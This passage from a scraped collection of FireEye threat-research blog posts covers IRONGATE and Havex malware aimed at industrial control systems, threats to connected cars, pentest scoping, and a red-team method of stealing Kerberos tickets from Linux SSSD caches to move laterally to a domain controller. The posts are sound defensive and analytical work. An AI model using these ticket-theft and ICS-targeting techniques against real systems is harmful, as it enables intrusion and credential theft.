WriteInputPoint(0x114, 0, 0x7763) every millisecond. All of these functions are named similarly to Siemens S7ProSim v5.4 COM interface. It appears that other calls to API functions are passed through the malicious DLL to the legitimate DLL with no other modification. Biogas.exe As mentioned previously, IRONGATE seeks to manipulate code similar to that found on a blog dealing with simulating PLC communications using PLCSIM, including the use of an executable named biogas.exe . Examination of the executable from that blog’s demo code shows that the WriteInputPoint function calls with byte indices 0x110 and 0x114 set pressure and temperature values, respectively: IRONGATE: WriteInputPoint(0x110, 0, 0x7763) WriteInputPoint(0x114, 0, 0x7763) Equivalent pseudo code from Biogas.exe: S7ProSim.WriteInputPoint(0x110, 0, (short)this.Pressure.Value) S7ProSim.WriteInputPoint(0x114, 0, (short)this.Temperature.Value) We have been unable to determine the significance of the hardcoded value 0x7763 , which is passed in both instances of the write function. Because of the noted indications that IRONGATE is a proof of concept, we cannot conclude IRONGATE’s author intends to manipulate specific temperature or pressure values associated with the specific biogas.exe process, but find the similarities to this example code striking. Artifacts and Indicators PyInstaller Artifacts The IRONGATE droppers are Python scripts converted to executables using PyInstaller. The compiled droppers contain PyInstaller artifacts from the system the executables were created on. These artifacts may link other samples compiled on the same system. Five of the six file droppers ( bla.exe, update.exe 1 , update_no_pipe.exe 1 , update_no_pipe.exe 2 and update.exe 3 ) all share the same PyInstaller artifacts listed in Table 1. Table 1: Pyinstaller Artifacts The remaining dropper, update.exe 2 , contains the artifacts listed in Table 2. Table 2: Pyinstaller Artifacts for update.exe 2 Unique Strings Figure 1 and 2 list the unique strings discovered in the scada.exe and Step7ProSim.dll binaries. Figure 1: Scada.exe Unique Strings Figure 2: Step7ProSim.dll Unique Strings File Hashes Table 3 contains the MD5 hashes, file and architecture type, and compile times for the malware analyzed in this report. Table 3: File MD5 Hashes and Compile Times FireEye detects IRONGATE. A list of indicators can be found here . Special thanks to the Siemens ProductCERT for providing support and context to this investigation. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2014-07-17",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye recently analyzed the capabilities of a variant of Havex (referred to by FireEye as “Fertger” or “PEACEPIPE”), the first publicized malware reported to actively scan OPC servers used for controlling SCADA (Supervisory Control and Data Acquisition) devices in critical infrastructure (e.g., water and electric utilities), energy, and manufacturing sectors. While Havex itself is a somewhat simple PHP Remote Access Trojan (RAT) that has been analyzed by other sources, none of these have covered the scanning functionality that could impact SCADA devices and other industrial control systems (ICS) . Specifically, this Havex variant targets servers involved in OPC (Object linking and embedding for Process Control) communication, a client/server technology widely used in process control systems (for example, to control water pumps, turbines, tanks, etc.). Note: ICS is a general term that encompasses SCADA (Supervisory Control and Data Acquisition) systems, DCS (Distributed Control Systems), and other control system environments. The term SCADA is well-known to wider audiences, and throughout this article, ICS and SCADA will be used interchangeably. Threat actors have leveraged Havex in attacks across the energy sector for over a year, but the full extent of industries and ICS systems affected by Havex is unknown. We decided to examine the OPC scanning component of Havex more closely, to better understand what happens when it’s executed and the possible implications. OPC Testing Environment To conduct a true test of the Havex variant’s functionality, we constructed an OPC server test environment that fully replicates a typical OPC server setup (Figure 1 [3] ). As shown, ICS or SCADA systems involve OPC client software that interacts directly with an OPC server, which works in tandem with the PLC (Programmable Logic Controller) to control industrial hardware (such as a water pump, turbine, or tank). FireEye replicated both the hardware and software the OPC server setup (the components that appear within the dashed line on the right side of Figure 1). Figure 1: Topology of typical OPC server setup The components of our test environment are robust and comprehensive to the point that our system could be deployed in an environment to control actual SCADA devices. We utilized an Arduino Uno [1] as the primary hardware platform, acting as the OPC server. The Arduino Uno is an ideal platform for developing an ICS test environment because of the low power requirements, a large number of libraries to make programming the microcontroller easier, serial communication over USB, and cheap cost. We leveraged the OPC Server and libraries from St4makers [2] (as shown in Figure 2). This software is available for free to SCADA engineers to allow them to develop software to communicate information to and from SCADA devices. Figure 2: OPC Server Setup Using the OPC Server libraries allowed us to make the Arduino Uno act as a true, functioning OPC SCADA device (Figure 3). Figure 3: Matrikon OPC Explorer showing Arduino OPC Server We also used Matrikon’s OPC Explorer [1] , which enables browsing between the Arduino OPC server and the Matrikon embedded simulation OPC server. In addition, the Explorer can be used to add certain data points to the SCADA device – in this case, the Arduino device. Figure 4: Tags identified for OPC server In the OPC testing environment, we created tags in order to simulate a true OPC server functioning. Tags, in relation to ICS devices, are single data points. For example: temperature, vibration, or fill level. Tags represent a single value monitored or controlled by the system at a single point in time. With our test environment complete, we executed the malicious Havex “.dll\" file and analyzed how Havex’s OPC scanning module might affect OPC servers it comes in contact with. Analysis The particular Havex sample we looked at was a file named PE.dll (6bfc42f7cb1364ef0bfd749776ac6d38). When looking into the scanning functionality of the particular Havex sample, it directly scans for OPC servers, both on the server the sample was submitted on, and laterally, across the entire network. The scanning process starts when the Havex downloader calls the runDll export function.  The OPC scanner module identifies potential OPC servers by using the Windows networking (WNet) functions.  Through recursive calls to WNetOpenEnum and WNetEnumResources, the scanner builds a list of all servers that are globally accessible through Windows networking.  The list of servers is then checked to determine if any of them host an interface to the Component Object Models (COM) listed below: Figure 5: Relevant COM objects Once OPC servers are identified, the following CLSIDs are used to determine the capabilities of the OPC server: Figure 6: CLSIDs used to determine capabilities of the OPC server When executing PE.dll, all of the OPC server data output is first saved as %TEMP%\\[random].tmp.dat. The results of a capability scan of an OPC server is stored in %TEMP%\\OPCServer[random].txt. Files are not encrypted or deleted once the scanning process is complete. Once the scanning completes, the log is deleted and the contents are encrypted and stored into a file named %TEMP%\\[random].tmp.yls.  The encryption process uses an RSA public key obtained from the PE resource TYU.  The RSA key is used to protect a randomly generated 168-bit 3DES key that is used to encrypt the contents of the log. The TYU resource is BZip2 compressed and XORed with the string “1312312”.  A decoded configuration for 6BFC42F7CB1364EF0BFD749776AC6D38 is included in the figure below: Figure 7: Sample decoded TYU resource The 4409de445240923e05c5fa6fb4204 value is believed to be an RSA key identifier. The AASp1… value is the Base64 encoded RSA key. A sample encrypted log file (%TEMP%\\[random].tmp.yls) is below. 00000000  32 39 0a 66 00 66 00 30  00 30 00 66 00 66 00 30 29.f.f.0.0.f.f.000000010  00 30 00 66 00 66 00 30  00 30 00 66 00 66 00 30 .0.f.f.0.0.f.f.000000020  00 30 00 66 00 66 00 30  00 30 00 66 00 66 00 30 .0.f.f.0.0.f.f.000000030  00 30 00 66 00 66 00 30  00 30 00 66 00 37 39 36 .0.f.f.0.0.f.79600000040  0a 31 32 38 0a 96 26 cc  34 93 a5 4a 09 09 17 d3 .128..&.4..J....00000050  e0 bb 15 90 e8 5d cb 01  c0 33 c1 a4 41 72 5f a5 .....]...3..Ar_.00000060  13 43 69 62 cf a3 80 e3  6f ce 2f 95 d1 38 0f f2 .Cib....o./..8..00000070  56 b1 f9 5e 1d e1 43 92  61 f8 60 1d 06 04 ad f9 V..^..C.a.`.....00000080  66 98 1f eb e9 4c d3 cb  ee 4a 39 75 31 54 b8 02 f....L...J9u1T..00000090  b5 b6 4a 3c e3 77 26 6d  93 b9 66 45 4a 44 f7 a2 ..J<.w&m..fEJD..000000A0  08 6a 22 89 b7 d3 72 d4  1f 8d b6 80 2b d2 99 5d .j\"...r.....+..]000000B0  61 87 c1 0c 47 27 6a 61  fc c5 ee 41 a5 ae 89 c3 a...G'ja...A....000000C0  9e 00 54 b9 46 b8 88 72  94 a3 95 c8 8e 5d fe 23 ..T.F..r.....].#000000D0  2d fb 48 85 d5 31 c7 65  f1 c4 47 75 6f 77 03 6b -.H..1.e..Guow.k --Truncated--Probable Key Identifierff00ff00ff00ff00ff00ff00ff00fRSA Encrypted 3DES Key5A EB 13 80 FE A6 B9 A9 8A 0F 41…The 3DES key will be the last 24 bytes of the decrypted result.3DES IV88 72  94 a3 95 c8 8e 5d3DES Encrypted Logfe 23 2d fb 48 85 d5 31 c7 65 f1… Figure 8: Sample encrypted .yls file Execution When executing PE.dll against the Arduino OPC server, we observe interesting responses within the plaintext %TEMP%\\[random].tmp.dat: Figure 9: Sample scan log The contents of the tmp.dat file are the results of the scan of the network devices, looking for OPC servers. These are not the in-depth results of the OPC servers themselves, and only perform the initial scanning. The particular Havex sample in question also enumerates OPC tags and fully interrogates the OPC servers identified within %TEMP%\\[random].tmp.dat. The particular fields queried are: server state, tag name, type, access, and id. The contents of a sample %TEMP%\\OPCServer[random].txt can be found below: Figure 10: Contents of OPCServer[Random].txt OPC interrogation While we don’t have a particular case study to prove the attacker’s next steps, it is likely after these files are created and saved, they will be exfiltrated to a command and control server for further processing. Conclusion Part of threat intelligence requires understanding all parts of a particular threat. This is why we took a closer look at the OPC functionality of this particular Havex variant.  We don’t have any case study showcasing why the OPC modules were included, and this is the first “in the wild” sample using OPC scanning. It is possible that these attackers could have used this malware as a testing ground for future utilization, however. Since ICS networks typically don’t have a high-level of visibility into the environment, there are several ways to help minimize some of the risks associated with a threat like Havex. First, ICS environments need to have the ability to perform full packet capture ability. This gives incident responders and engineers better visibility should an incident occur. Also, having mature incident processes for your ICS environment is important. Being able to have security engineers that also understand ICS environments during an incident is paramount. Finally, having trained professionals consistently perform security checks on ICS environments is helpful. This ensures standard sets of security protocols and best practices are followed within a highly secure environment. We hope that this information will further educate industrial control systems owners and the security community about how the OPC functionality of this threat works and serves as the foundation for more investigation. Still, lots of questions remain about this component of Havex. What is the attack path? Who is behind it? What is their intention? We’re continuing to track this specific threat and will provide further updates as this new tactic unfolds. Acknowledgements We would like to thank Josh Homan for his help and support. Related MD5s ba8da708b8784afd36c44bb5f1f436bc 6bfc42f7cb1364ef0bfd749776ac6d38 4102f370aaf46629575daffbd5a0b3c9 References http://www.matrikonopc.com/products/opc-desktop-tools/opc-explorer.aspx http://arduino.cc/en/Main/arduinoBoardUno http://www.f-secure.com/weblog/archives/00002718.html http://www.opcdatahub.com/WhatIsOPC.html Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2013/11/critical-infrastructure-power-grid.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2013-11-19",
                    "source": "www.fireeye.com"
                },
                "text": "The term \"critical infrastructure\" has earned its spot on the board of our ongoing game of cyber bingo--right next to \"Digital Pearl Harbor,\" \"Cyber 9/11,\" \"SCADA\" and \"Stuxnet.\" With \"critical infrastructure\" thrown about in references to cyber threats nearly every week, we thought it was time for a closer look at just what the term means-and what it means to other cyber threat actors. The term \" critical infrastructure \" conjures up images of highways, electrical grids, pipelines, government facilities and utilities. But the U.S. government definition also includes economic security and public health. The Department of Homeland Security defines critical infrastructure as \"Systems and assets, whether physical or virtual, so vital to the United States that the incapacity or destruction of such systems and assets would have a debilitating impact on security, national economic security, national public health or safety, or any combination of those matters.\" [1] Certainly the U.S. definition is expansive, but some key cyber actors go a step further to include a more abstract \"information \" asset. Russian officials view information content, flow and influencers as an enormous component of critical infrastructure. Iran and China similarly privilege the security of their information assets in order to protect their governments. The bottom line? U.S. companies, who may have never considered themselves a plausible target for cyber threats, could become victims of offensive or defensive state cyber operations. Earlier this year several media outlets-including the New York Times and Washington Post-disclosed that they had been the victims of China-based intrusions. The Times and the Post linked the intrusions on their networks to their reporting on corruption in the upper echelons of the Chinese Communist Party and other issues. These media outlets weren't sitting on plans for a new fighter jet or cutting edge wind turbines-information often assumed to be at risk for data theft. Rather, the reporters at the Times and Post were perched in key positions to influence U.S. government and public views of the Chinese leadership, possibly in a negative light. The Chinese government had conducted these intrusions against what it deemed critical infrastructure that supported the flow of valuable information. Who's up next? State actors motivated to target critical infrastructure (by their own definition or the U.S.') won't just be the usual attention grabbers in cyberspace. We estimate that Iran, Syria, and North Korea all have interest and would be able to conduct or direct some level of network operations. These states are also likely to conduct operations in the near term to identify red lines and gauge corporate and government reactions. With little reputational loss at stake, we expect actors sponsored by or associated with these states to target an array of critical infrastructure targets. Companies who serve as key information brokers-for the public or the U.S. government-should be particularly attuned to the criticality their work is assigned by a variety of cyber threat actors. http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/06/connected_cars_the.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2016-06-10",
                    "source": "www.fireeye.com"
                },
                "text": "As vehicles become both increasingly complex and better connected to the Internet, their newfound versatility may be manipulated for malicious purposes. Three of the most concerning potential threats looking ahead to the next few years are those posed by manipulating vehicle operation , ransomware and using vehicular systems as command and control (C2) infrastructure for illicit cyber activity. Car Hacking? Vehicles have come a long way in terms of the high-tech features and connectivity that come standard in most new models. Modern cars are controlled almost entirely by software, and many drivers don’t realize the most complex digital device they own may be in their driveway . Of the growing number of devices in the “Internet of Things” (IoT), vehicles are among the most significant additions to the global Internet. An ever-growing list of features—including web browsing, Wi-Fi access points, and remote-start mobile phone apps—enhance user enjoyment, but also greatly expand vehicles’ attack surface, rendering them potentially vulnerable to advanced attacks. During the past year especially, numerous proof-of-concept demonstrations have revealed connected-car vulnerabilities that malicious actors can exploit, ranging from unauthorized entry to commandeering the vehicle’s operation . Unfortunately, as consumer demand drives ever more features, the opportunities for compromise will increase as well. Ransomware The scourge of ransomware has so far affected thousands of systems belonging to ordinary individuals, hospitals, and police stations. A vehicle’s increased connectivity, ever-expanding attack surface, and high upfront cost make them attractive ransomware targets. In contrast to ransomware that infects ordinary computer systems, vehicles are more likely susceptible to ransomware attacks when their disablement causes knock-on effects. For example, where a single driver might be able to reinstall his car’s software with the help of a mechanic to remedy a ransomware infection, a group of vehicles disabled on a busy highway could cause far more serious disruption. Victims or municipal authorities may have little choice but to pay the ransom to reopen a busy commuting route. Alternatively, a logistics company might suddenly find a large portion of its truck fleet rendered useless by ransomware. The potential for lost revenue due to downtime might pressure the company to pay the ransom rather than risk more significant financial losses. Malicious C2 and Final Hop Points One effective law enforcement tactic in countering cyber espionage and criminal campaigns is identifying, locating and seizing the systems threat actors use to route malicious traffic through the Internet. Since many modern vehicles can be better described as a computer attached to four wheels and an engine, their mobility and power present challenges to this means of countering threat activity. We have already witnessed malware designed to hijack IoT devices for malicious purposes; vehicular systems’ greater computing power, compared to connected home thermostats, can significantly enhance their value as a C2 node . Locating vehicles used to route malicious traffic would present a major challenge to law enforcement investigation, largely due to their mobility. We have not yet observed threat actors using connected vehicle systems to route malicious traffic, but it is most likely that a vehicle would be used as a final hop point to the intended target network. The perpetrators may use the vehicle only once, choosing to hijack the connectivity of a different vehicle on their next operation, and so on. This ever-changing roster of potential last-hop nodes situated on highly mobile platforms may allow threat actors to elude law enforcement for extended periods of time. Understanding the Risk Landscape The impact of cyber threats is most often considered in financial terms—the cost of a breach, whether direct financial losses or indirect costs of investigation, remediation, and improved security. As computers increasingly control vehicles, among other critical devices and systems, the potential for malfunction or manipulation that causes human harm rises dramatically. Automobile manufacturers may face greater liability, not only for the car’s physical components, but its software as well. How long before vehicles need a “cyber security rating,” similar to that awarded for crash testing and fuel economy? These new risks point to the need for automotive manufacturers and suppliers to not only ensure the traditional operational safety of their vehicles, but to also secure both the vehicle's operations and occupant privacy. This requires an ongoing understanding about the nature of threats and vulnerabilities in a rapidly evolving landscape, and building in strong proactive security measures to protect against these risks. FireEye explores these risks to automotive safety in our latest FireEye iSIGHT Intelligence and Mandiant Consulting report: Connected Cars: The Open Road for Hackers . The report is available for download here. FireEye Capabilities FireEye combines our industry leading threat intelligence , incident response and red team capabilities with our ICS domain expertise to help the automotive industry improve their prevention, detection and response capabilities. FireEye’s Red Team Operations and Penetration Tests can provide firms in the automotive industry experience responding to real-world attacks without the risk of negative headlines. A one-time risk assessment is not enough, because threat attackers are consistently evolving. For more information, contact FireEye . FireEye iSIGHT Intelligence’s Horizons Team conducts strategic forecasting to anticipate risks posed by emerging technologies and geopolitical developments, helping clients and the public better assess their exposure to a dynamic cyber threat landscape. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/09/ws-penetration-testing.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2014-09-16",
                    "source": "www.fireeye.com"
                },
                "text": "Often in discussions with customers and potential customers,\nquestions arise about our penetration testing services , as well as\npenetration testing in general. In this post, we want to walk\nthrough Mandiant's take on the five W's of penetration testing, in\nhopes of helping those of you who many have some of these same\nquestions. For clarity, we are going to walk through these W's in a\nnon-traditional order. Why First and foremost, it's important to be upfront\nwith yourself with why you are having a penetration test performed\n(or at least considering one). If your organization's primary\nmotivation is compliance and needing to \"check the box,\"\nthen be on the lookout for your people attempting to subtly (or not\nso subtly) hinder the test in order to earn an \"easy pass\"\nby minimizing the number of findings (and therefore the amount of\npotential remediation work required). Individuals could attempt to\nhinder a penetration test by placing undue restrictions on the scope\nof systems assessed, the types of tools that can be used, or the\ntiming of the test. Even if compliance is a motivating\nfactor, we hope you're able to take advantage of the opportunity\npenetration testing provides to determine where vulnerabilities lie\nand make your systems more secure. That is the real value that\npenetration testing can provide. Finally, if you are getting\na penetration test to comply with requirements imposed on your\norganization, that will often drive some of the answers to later\nquestions about the type and scope of the test. Keep in mind that\nstandards only dictate minimum requirements, however, so you should\nalso consider additional penetration testing activities beyond the\n\"bare minimum.\" Who There are really two \"who\" questions to\nconsider, but for now we will just deal with the first: Who are the\nattackers that concern you? Are they: Random\nindividuals on the Internet? Specific threat actors, such\nas state-sponsored attackers, organized criminals, or hacktivist\ngroups? An individual or malware that is behind the\nfirewall and on your internal corporate network? Your own\nemployees (\"insider threats\")? Your customers\n(or attackers who may compromise customers'\nsystems/accounts)? Your vendors, service providers, and\nother business partners (or attackers who may have compromised\ntheir systems)? The answer to this will help drive\nthe type of testing to be performed and the types of test user\naccounts (if any) to provision. The next section will describe some\npossible penetration test types, but it's helpful to also discuss\nthe types of attackers you would like the penetration test to\nsimulate. What What type of penetration test do you want\nperformed? For organizations new to penetration testing, we\nrecommend starting with an external network penetration test, which\nwill assess your Internet-accessible systems in the same way that an\nattacker anywhere in the world could access them. Beyond that, there\nare several options: Internal network penetration test\n- A penetration test of your internal corporate network. Typically\nwe start these types of assessments with only a network connection\non the corporate networks, but a common variant is what we call an\n\"Insider Threat Assessment,\" where we start with one of\nyour standard workstations and a standard user account. Web application security assessment - A review of custom web\napplication code for security vulnerabilities such as access\ncontrol issues, SQL injection, cross-site scripting (XSS) and\nothers. These are best done in a test or development environment\nto minimize impact to the production environment. Social\nengineering - Using deceptive email, phone calls, and/or physical\nentry to gain access to systems. Wireless penetration\ntest - A detailed security assessment of wireless network(s) at\none or more of your locations. This typically includes a survey of\nthe location looking for unauthorized (\"rogue\") wireless\naccess points that have been connected to the corporate network\nand are often insecurely configured. If budgets were\nnot an issue, you would want to do all of the above, but in reality\nyou will need to prioritize your efforts on what makes sense for\nyour organization. Keep in mind that the best approach may change\nover time as your organization matures. Where In what physical location should the test take\nplace? Many types of penetration testing can be done remotely, but\nsome require the testers to visit your facility. Physical social\nengineering engagements and wireless assessments clearly need to be\nperformed at one (or more) of your locations. Some internal\npenetration tests can be done remotely via a VPN connection, but we\nrecommend conducting them at your location whenever possible. If\nyour internal network has segmentation in place (as we recommend),\nthen you should work with your penetration testing organization to\ndetermine the best physical location for the test to be performed.\nGenerally, you'll want to do the internal penetration test from a\nnetwork segment that has broad access to other portions of the\ninternal network in order to get the best coverage from the\ntest. Another \"Where\" to consider for remote testing\nis where the testers are physically located. When testers are in a\ndifferent country than you, legal issues can arise with data\nprovisioning and accessibility. Differences in language, culture,\nand time zones could also make coordination and interpretation of\nresults more difficult. When We recommend that most organizations get some\nsort of security assessment on an annual basis, but that security\nassessment does not necessarily need to be a penetration test (see Penetration\nTesting Has Come Of Age - How to Take Your Security Program to the\nNext Level ). Larger organizations may have multiple\nassessments per year, each focused in a different area. Within the year, the timing of the penetration test is usually\npretty flexible. You will want to make sure that the right people\nfrom your organization are available to initiate and manage the test\n- and to receive results and begin implementing changes. Based on\nyour organization's change control procedures, you may need to work\naround system freezes or other activities. Testing in December can\nbe difficult due to holidays and vacation, along with year-end\ncloseout activities, especially for organizations in retail,\ne-commerce, and payment processing. If you have significant\nupgrades planned for the systems that will be tested, it is\ntypically best to schedule the test for a month or two after the\nupgrades are due to be finished. This will allow some time for the\ninevitable delays in deploying the upgrades as well give the\nupgraded systems (and their administrators) a bit of time to\n\"settle in\" and get fully configured before being\ntested. Who (part 2) The other \"who\" question to\nconsider is who will perform the penetration test? We recommend\nconsidering the following when selecting a penetration testing\nprovider: What are the qualifications of the organization\nand the individuals who will be performing the test? What\ndifferentiates them from other providers? To what degree\ndoes their testing rely on automated vulnerability scanners vs.\nhands on manual testing? How well do they understand the\nthreat actors that are relevant to your environment? How well are\nthey able to emulate real world attacks? What\ndeliverables will you receive from the test? Are they primarily\nthe output of an automated tool? Ask for samples. Are\nthey unbiased? Do they use penetration tests as a means to sell or\nresell other products and services? No doubt, there\nare other questions that you will want to consider when scoping a\npenetration test, but we hope that these will help you get started.\nIf you'd like to read more about Mandiant's penetration testing (and\nother) services, you can do so here . Of course,\nalso feel free to contact\nus if you'd like to talk about your situation and how Mandiant\ncan best assess your organization's security. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-04-01",
                    "source": "www.fireeye.com"
                },
                "text": "At FireEye Mandiant , we conduct numerous red team engagements within Windows Active Directory environments. Consequently, we frequently encounter Linux systems integrated within Active Directory environments. Compromising an individual domain-joined Linux system can provide useful data on its own, but the best value is obtaining data, such as Kerberos tickets, that will facilitate lateral movement techniques. By passing these Kerberos Tickets from a Linux system, it is possible to move laterally from a compromised Linux system to the rest of the Active Directory domain. There are several ways to configure a Linux system to store Kerberos tickets. In this blog post, we will introduce Kerberos and cover some of the various storage solutions. We will also introduce a new tool that extracts Kerberos tickets from domain-joined systems that utilize the System Security Services Daemon Kerberos Cache Manager (SSSD KCM). What is Kerberos Kerberos is a standardized authentication protocol that was originally created by MIT in the 1980s. The protocol has evolved over time. Today, Kerberos Version 5 is implemented by numerous products, including Microsoft Active Directory. Kerberos was originally designed to mutually authenticate identities over an unsecured communication line. The Microsoft implementation of Kerberos is used in Active Directory environments to securely authenticate users to various services, such as the domain (LDAP), database servers (MSSQL) and file shares (SMB/CIFS). While other authentication protocols exist within Active Directory, Kerberos is one of the most popular methods. Technical documentation on how Microsoft implemented Kerberos Protocol Extensions within Active Directory can be found in the MS-KILE standards published on MSDN. Short Example of Kerberos Authentication in Active Directory To illustrate how Kerberos works, we have selected a common scenario where a user John Smith with the account ACMENET.CORP\\sa_jsmith wishes to authenticate to a Windows SMB (CIFS) file share in the Acme Corporation domain, hosted on the server SQLSERVER.ACMENET.CORP. There are two main types of Kerberos tickets used in Active Directory: Ticket Granting Ticket (TGT) and service tickets. Service tickets are obtained from the Ticket Granting Service (TGS). The TGT is used to authenticate the identity of a particular entity in Active Directory, such as a user account. Service tickets are used to authenticate a user to a specific service hosted on a system. A valid TGT can be used to request service tickets from the Key Distribution Center (KDC). In Active Directory environments, the KDC is hosted on a Domain Controller. The diagram in Figure 1 shows the authentication flow. Figure 1: Example Kerberos authentication flow In summary: The user requests a Ticket Granting Ticket (TGT) from the Domain Controller. Once granted, the user passes the TGT back to the Domain Controller and requests a service ticket for cifs/SQLSERVER.ACMENET.CORP. After the Domain Controller validates the request, a service ticket is issued that will authenticate the user to the CIFS (SMB) service on SQLSERVER.ACMENET.CORP. The user receives the service ticket from the Domain Controller and initiates an SMB negotiation with SQLSERVER.ACMENET.CORP. During the authentication process, the user provides a Kerberos blob inside an “AP-REQ” structure that includes the service ticket previously obtained. The server validates the service ticket and authenticates the user. If the server determines that the user has permissions to access the share, the user can begin making SMB queries. For an in-depth example of how Kerberos authentication works, scroll down to view the appendix at the bottom of this article. Kerberos On Linux Domain-Joined Systems When a Linux system is joined to an Active Directory domain, it also needs to use Kerberos tickets to access services on the Windows Active Directory domain. Linux uses a different Kerberos implementation. Instead of Windows formatted tickets (commonly referred to as the KIRBI format), Linux uses MIT format Kerberos Credential Caches (CCACHE files). When a user on a Linux system wants to access a remote service with Kerberos, such as a file share, the same procedure is used to request the TGT and corresponding service ticket. In older, more traditional implementations, Linux systems often stored credential cache files in the /tmp directory. Although the files are locked down and not world-readable, a malicious user with root access to the Linux system could trivially obtain a copy of the Kerberos tickets and reuse them. On modern versions of Red Hat Enterprise Linux and derivative distributions, the System Security Services Daemon (SSSD) is used to manage Kerberos tickets on domain-joined systems. SSSD implements its own form of Kerberos Cache Manager (KCM) and encrypts tickets within a database on the system. When a user needs access to a TGT or service ticket, the ticket is retrieved from the database, decrypted, and then passed to the remote service (for more on SSSD, check out this great research from Portcullis Labs ). By default, SSSD maintains a copy of the database at the path /var/lib/sss/secrets/secrets.ldb. The corresponding key is stored as a hidden file at the path /var/lib/sss/secrets/.secrets.mkey. By default, the key is only readable if you have root permissions. If a user is able to extract both of these files, it is possible to decrypt the files offline and obtain valid Kerberos tickets. We have published a new tool called SSSDKCMExtractor that will decrypt relevant secrets in the SSSD database and pull out  the credential cache Kerberos blob. This blob can be converted into a usable Kerberos CCache file that can be passed to other tools, such as Mimikatz , Impacket , and smbclient . CCache files can be converted into Windows format using tools such as Kekeo . We leave it as an exercise to the reader to convert the decrypted Kerberos blob into a usable credential cache file for pass-the-cache and pass-the-ticket operations. Using SSSDKCMExtractor is simple. An example SSSD KCM database and key are shown in Figure 2. Figure 2: SSSD KCM files Invoking SSSDKCMExtractor with the --database and --key parameters will parse the database and decrypt the secrets as shown in Figure 3. Figure 3: Extracting Kerberos data After manipulating the data retrieved, it is possible to use the CCACHE in smbclient as shown in Figure 4. In this example, a domain administrator ticket was obtained and used to access the domain controller’s C$ share. Figure 4: Compromising domain controller with extracted tickets The Python script and instructions can be found on the FireEye Github. Conclusion By obtaining privileged access to a domain-joined Linux system, it is often possible to scrape Kerberos tickets useful for lateral movement. Although it is still common to find these tickets in the /tmp directory, it is now possible to also scrape these tickets from modern Linux systems that utilize the SSSD KCM. With the right Kerberos tickets, it is possible to move laterally to the rest of the Active Directory domain. If a privileged user authenticates to a compromised Linux system (such as a Domain Admin) and leaves a ticket behind, it would be possible to steal that user's ticket and obtain privileged rights in the Active Directory domain. Appendix: Detailed Example of Kerberos Authentication in Active Directory To illustrate how Kerberos works, we have selected a common scenario where a user John Smith with the account ACMENET.CORP\\sa_jsmith wishes to authenticate to a Windows SMB (CIFS) file share in the Acme Corporation domain, hosted on the server SQLSERVER.ACMENET.CORP. There are two main types of Kerberos ticket types used in Active Directory: Ticket Granting Ticket (TGT) and service tickets. Service tickets are obtained from the Ticket Granting Service (TGS). The TGT is used to authenticate the identity of a particular entity in Active Directory, such as a user account. Service tickets are used to authenticate a user to a specific service hosted on a domain- joined system. A valid TGT can be used to request service tickets from the Key Distribution Center (KDC). In Active Directory environments, the KDC is hosted on a Domain Controller. When the user wants to authenticate to the remote file share, Windows first checks if a valid TGT is present in memory on the user's workstation. If a TGT isn't present, a new TGT is requested from the Domain Controller in the form of an AS-REQ request. To prevent password cracking attacks ( AS-REP Roasting ), by default, Kerberos Preauthentication is performed first. Windows creates a timestamp and encrypts the timestamp with the user's Kerberos key (Note: User Kerberos keys vary based on encryption type. In the case of RC4 encryption, the user's RC4 Kerberos key is directly derived from the user's account password. In the case of AES encryption, the user's Kerberos key is derived from the user's password and a salt based on the username and domain name). The domain controller receives the request and decrypts the timestamp by looking up the user's Kerberos key. An example AS-REQ packet is shown in Figure 5. Figure 5: AS-REQ Once preauthentication is successful, the Domain Controller issues an AS-REP response packet that contains various metadata fields, the TGT itself, and an \"Authenticator\". The data within the TGT itself is considered sensitive. If a user could freely modify the content within the TGT, they could impersonate any user in the domain as performed in the Golden Ticket attack. To prevent this from easily occurring, the TGT is encrypted with the long term Kerberos key stored on the Domain Controller. This key is derived from the password of the krbtgt account in Active Directory. To prevent users from impersonating another user with a stolen TGT blob, Active Directory’s Kerberos implementation uses session keys that are used for mutual authentication between the user, domain, and service. When the TGT is requested, the Domain Controller generates a session key and places it in two places: the TGT itself (which is encrypted with the krbtgt key and unreadable by the end user), and in a separate structure called the Authenticator. The Domain Controller encrypts the Authenticator with the user's personal Kerberos key. When Windows receives the AS-REP packet back from the domain controller, it caches the TGT ticket data itself into memory. It also decrypts the Authenticator with the user's Kerberos key and obtains a copy of the session key generated by the Domain Controller. Windows stores this session key in memory for future use. At this point, the user's system has a valid TGT that it can use to request service tickets from the domain controller. An example AS-REP packet is shown in Figure 6. Figure 6: AS-REP After obtaining a valid TGT for the user, Windows requests a service ticket for the file share service hosted on the remote system SQLSERVER.ACMENET.CORP. The request is made using the service's Service Principal Name (“SPN”). In this case, the SPN would be cifs/SQLSERVER.ACMENET.CORP. Windows builds the service ticket request in a TGS-REQ packet. Within the TGS-REQ packet, Windows places a copy of the TGT previously obtained from the Domain Controller. This time, the Authenticator is encrypted with the TGT session key previously obtained from the domain controller. An example TGS-REQ packet is shown in Figure 7. Figure 7: TGS-REQ Once the Domain Controller receives the TGS-REQ packet, it extracts the TGT from the request and decrypts it with the krbtgt Kerberos key. The Domain Controller verifies that the TGT is valid and extracts the session key field from the TGT. The Domain Controller then attempts to decrypt the Authenticator in the TGS-REQ packet with the session key. Once decrypted, the Domain Controller examines the Authenticator and verifies the contents. If this operation succeeds, the user is considered authenticated by the Domain Controller and the requested service ticket is created. The Domain Controller generates the service ticket requested for cifs/SQLSERVER.ACMENET.CORP. The data within the service ticket is also considered sensitive. If a user could manipulate the service ticket data, they could impersonate any user on the domain to the service as 